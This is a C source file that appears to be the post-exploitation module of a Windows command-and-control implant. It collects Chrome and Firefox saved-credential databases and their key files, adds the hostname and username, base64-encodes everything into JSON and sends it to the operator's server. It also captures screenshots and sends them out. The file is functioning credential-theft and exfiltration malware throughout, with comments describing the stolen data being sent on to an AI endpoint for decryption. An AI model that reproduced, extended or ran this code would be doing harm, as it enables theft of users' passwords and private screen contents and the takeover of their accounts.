
#include <windows.h>
#include <stdio.h>
#include "comms.h"

#define MAX_LOOT_FILES 10

typedef struct _LOOT_FILE {
    CHAR path[MAX_PATH];
    PBYTE data;
    DWORD size;
} LOOT_FILE, *PLOOT_FILE;

typedef struct _LOOT_BUNDLE {
    CHAR hostname[64];
    CHAR username[64];
    DWORD fileCount;
    LOOT_FILE files[MAX_LOOT_FILES];
} LOOT_BUNDLE, *PLOOT_BUNDLE;

// ── Helpers ──────────────────────────────────────────────────────────

// Read an entire file into a heap buffer.
static BOOL read_file_to_heap(LPCSTR path, PBYTE* ppData, DWORD* pdwSize) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD sz = GetFileSize(hFile, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hFile); return FALSE; }

    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) { CloseHandle(hFile); return FALSE; }

    DWORD read = 0;
    if (!ReadFile(hFile, buf, sz, &read, NULL) || read != sz) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);
    *ppData = buf;
    *pdwSize = sz;
    return TRUE;
}

// Copy a locked file via temp snapshot (Chrome keeps Login Data locked).
static BOOL copy_locked_file(LPCSTR src, LPCSTR dst) {
    return CopyFileA(src, dst, FALSE);
}

// Add a file to the loot bundle (reads from disk).
static BOOL bundle_add_file(PLOOT_BUNDLE b, LPCSTR path) {
    if (b->fileCount >= MAX_LOOT_FILES) return FALSE;
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) return FALSE;

    PLOOT_FILE lf = &b->files[b->fileCount];
    lstrcpynA(lf->path, path, MAX_PATH);

    if (!read_file_to_heap(path, &lf->data, &lf->size)) return FALSE;

    b->fileCount++;
    printf("[+] bundle: Added %s (%lu bytes)\n", path, lf->size);
    return TRUE;
}

// Base64 encode (RFC 4648) — no padding validation needed, output only.
static const CHAR b64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static DWORD base64_encode(const BYTE* in, DWORD inLen, CHAR* out, DWORD outMax) {
    DWORD i = 0, o = 0;
    for (; i + 2 < inLen && o + 4 < outMax; i += 3) {
        out[o++] = b64[(in[i] >> 2) & 0x3F];
        out[o++] = b64[((in[i] & 0x3) << 4) | (in[i+1] >> 4)];
        out[o++] = b64[((in[i+1] & 0xF) << 2) | (in[i+2] >> 6)];
        out[o++] = b64[in[i+2] & 0x3F];
    }
    if (i < inLen && o + 4 < outMax) {
        out[o++] = b64[(in[i] >> 2) & 0x3F];
        if (i + 1 < inLen) {
            out[o++] = b64[((in[i] & 0x3) << 4) | (in[i+1] >> 4)];
            out[o++] = b64[((in[i+1] & 0xF) << 2)];
        } else {
            out[o++] = b64[((in[i] & 0x3) << 4)];
            out[o++] = '=';
        }
        out[o++] = '=';
    }
    out[o] = '\0';
    return o;
}

BOOL postex_screenshot(OUT PBYTE* ppBmpData, OUT DWORD* pdwBmpSize) {
    *ppBmpData = NULL;
    *pdwBmpSize = 0;

    // Get screen DC
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        printf("[!] screenshot: GetDC failed\n");
        return FALSE;
    }

    int width  = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);

    // BitBlt screen into our bitmap
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    // Get bitmap info
    BITMAP bmp = {0};
    GetObject(hBmp, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER biHeader = {0};
    biHeader.biSize        = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth       = width;
    biHeader.biHeight      = height;
    biHeader.biPlanes      = 1;
    biHeader.biBitCount    = (WORD)(bmp.bmBitsPixel);
    biHeader.biCompression = BI_RGB;

    DWORD dwBmpDataSize = ((width * biHeader.biBitCount + 31) / 32) * 4 * height;

    // Allocate buffer for BMP file
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) +
                       sizeof(BITMAPINFOHEADER) + dwBmpDataSize;
    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuf) {
        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    // Fill BMP file header
    BITMAPFILEHEADER bfHeader = {0};
    bfHeader.bfType    = 0x4D42; // "BM"
    bfHeader.bfSize    = dwFileSize;
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    memcpy(pBuf, &bfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(pBuf + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));

    // Get the actual pixel data
    GetDIBits(hdcMem, hBmp, 0, height,
              pBuf + bfHeader.bfOffBits,
              (BITMAPINFO*)&biHeader, DIB_RGB_COLORS);

    *ppBmpData  = pBuf;
    *pdwBmpSize = dwFileSize;

    // Cleanup GDI
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    printf("[+] screenshot: Captured %dx%d (%ld bytes)\n",
           width, height, dwFileSize);
    return TRUE;
}

// ── T1555.003: Browser credential file collection ───────────────────
// Collects raw browser DB files into the LOOT_BUNDLE.
// Actual decryption (SQLite + DPAPI / NSS) happens server-side:
//   beacon → TeamServer → AI endpoint (JSON with base64-encoded files).

// Grab Chrome Login Data + Local State (DPAPI-encrypted AES master key).
static BOOL postex_grab_chrome(PLOOT_BUNDLE bundle) {
    CHAR loginData[MAX_PATH] = {0};
    CHAR localState[MAX_PATH] = {0};
    CHAR tempCopy[MAX_PATH]  = {0};

    ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
        loginData, MAX_PATH);
    ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
        localState, MAX_PATH);

    if (GetFileAttributesA(loginData) == INVALID_FILE_ATTRIBUTES) {
        printf("[*] chrome: Login Data not found\n");
        return FALSE;
    }

    // Chrome locks Login Data — copy to temp before reading
    GetTempPathA(MAX_PATH, tempCopy);
    lstrcatA(tempCopy, "LoginData.tmp");
    if (!copy_locked_file(loginData, tempCopy)) {
        printf("[!] chrome: Failed to copy Login Data\n");
        return FALSE;
    }

    bundle_add_file(bundle, tempCopy);
    DeleteFileA(tempCopy); // clean up temp copy from disk

    // Local State has the encrypted AES key (Chrome v80+ encryption)
    bundle_add_file(bundle, localState);

    printf("[+] chrome: Collected Login Data + Local State\n");
    return TRUE;
}

// Grab Firefox logins.json + key4.db from each profile.
static BOOL postex_grab_firefox(PLOOT_BUNDLE bundle) {
    CHAR profilesDir[MAX_PATH] = {0};
    ExpandEnvironmentStringsA(
        "%APPDATA%\\Mozilla\\Firefox\\Profiles",
        profilesDir, MAX_PATH);

    if (GetFileAttributesA(profilesDir) == INVALID_FILE_ATTRIBUTES) {
        printf("[*] firefox: Profiles dir not found\n");
        return FALSE;
    }

    // Search for *.default* profile directories
    CHAR searchPath[MAX_PATH];
    wsprintfA(searchPath, "%s\\*", profilesDir);

    WIN32_FIND_DATAA fd = {0};
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    BOOL found = FALSE;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;

        // Check for logins.json in this profile
        CHAR loginsPath[MAX_PATH], key4Path[MAX_PATH];
        wsprintfA(loginsPath, "%s\\%s\\logins.json", profilesDir, fd.cFileName);
        wsprintfA(key4Path,   "%s\\%s\\key4.db",     profilesDir, fd.cFileName);

        if (GetFileAttributesA(loginsPath) != INVALID_FILE_ATTRIBUTES) {
            bundle_add_file(bundle, loginsPath);
            // key4.db contains the NSS private key DB needed for decryption
            bundle_add_file(bundle, key4Path);
            found = TRUE;
            printf("[+] firefox: Collected from profile %s\n", fd.cFileName);
        }
    } while (FindNextFileA(hFind, &fd) && bundle->fileCount < MAX_LOOT_FILES);

    FindClose(hFind);
    return found;
}

// ── Serialize LOOT_BUNDLE → JSON with base64-encoded file data ──────
// Output format (sent to TeamServer → AI):
// {
//   "task": "grab_creds",
//   "hostname": "WORKSTATION-01",
//   "username": "jsmith",
//   "files": [
//     { "path": "...", "size": 12345, "data_b64": "AAAA..." },
//     ...
//   ]
// }
static BOOL postex_serialize_bundle(PLOOT_BUNDLE b, PBYTE* ppOut, DWORD* pdwOutLen) {
    // Estimate upper bound: header ~256 + per file (path + 4/3 * size + overhead)
    DWORD estimate = 512;
    for (DWORD i = 0; i < b->fileCount; i++)
        estimate += MAX_PATH + 64 + ((b->files[i].size * 4) / 3) + 16;

    CHAR* json = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, estimate);
    if (!json) return FALSE;

    int pos = wsprintfA(json,
        "{\"task\":\"grab_creds\","
        "\"hostname\":\"%s\","
        "\"username\":\"%s\","
        "\"files\":[",
        b->hostname, b->username);

    for (DWORD i = 0; i < b->fileCount; i++) {
        PLOOT_FILE lf = &b->files[i];
        if (i > 0) json[pos++] = ',';

        pos += wsprintfA(json + pos,
            "{\"path\":\"%s\",\"size\":%lu,\"data_b64\":\"",
            lf->path, lf->size);

        // Base64-encode file data directly into the JSON buffer
        DWORD remaining = estimate - (DWORD)pos - 32;
        pos += base64_encode(lf->data, lf->size, json + pos, remaining);

        json[pos++] = '"';
        json[pos++] = '}';
    }

    pos += wsprintfA(json + pos, "]}");

    *ppOut = (PBYTE)json;
    *pdwOutLen = (DWORD)pos;
    return TRUE;
}

// ── Task dispatch entry point for post-exploitation ─────────────────
BOOL postex_run(LPCSTR taskName) {

    // ── grab_creds: collect browser files → JSON → beacon_post → AI ──
    if (strcmp(taskName, "grab_creds") == 0) {
        LOOT_BUNDLE bundle = {0};
        DWORD hnLen = sizeof(bundle.hostname);
        DWORD unLen = sizeof(bundle.username);
        GetComputerNameA(bundle.hostname, &hnLen);
        GetUserNameA(bundle.username, &unLen);

        postex_grab_chrome(&bundle);
        postex_grab_firefox(&bundle);

        if (bundle.fileCount == 0) {
            printf("[*] No browser data found\n");
            return FALSE;
        }

        PBYTE packed = NULL;
        DWORD packedLen = 0;
        if (!postex_serialize_bundle(&bundle, &packed, &packedLen)) {
            printf("[!] Failed to serialize loot bundle\n");
            return FALSE;
        }

        printf("[+] grab_creds: Sending %lu bytes JSON to C2\n", packedLen);

        BYTE* resp = NULL;
        DWORD respLen = 0;
        beacon_post(packed, packedLen, &resp, &respLen);

        // Cleanup
        for (DWORD i = 0; i < bundle.fileCount; i++) {
            if (bundle.files[i].data)
                HeapFree(GetProcessHeap(), 0, bundle.files[i].data);
        }
        HeapFree(GetProcessHeap(), 0, packed);
        if (resp) HeapFree(GetProcessHeap(), 0, resp);

        return TRUE;
    }

    // ── screenshot ───────────────────────────────────────────────────
    if (strcmp(taskName, "screenshot") == 0) {
        PBYTE data = NULL;
        DWORD size = 0;
        if (!postex_screenshot(&data, &size)) return FALSE;

        // Send screenshot back to C2
        BYTE* resp = NULL;
        DWORD respLen = 0;
        beacon_post(data, size, &resp, &respLen);
        HeapFree(GetProcessHeap(), 0, data);
        if (resp) HeapFree(GetProcessHeap(), 0, resp);
        return TRUE;
    }

    printf("[!] postex_run: Unknown task '%s'\n", taskName);
    return FALSE;
}
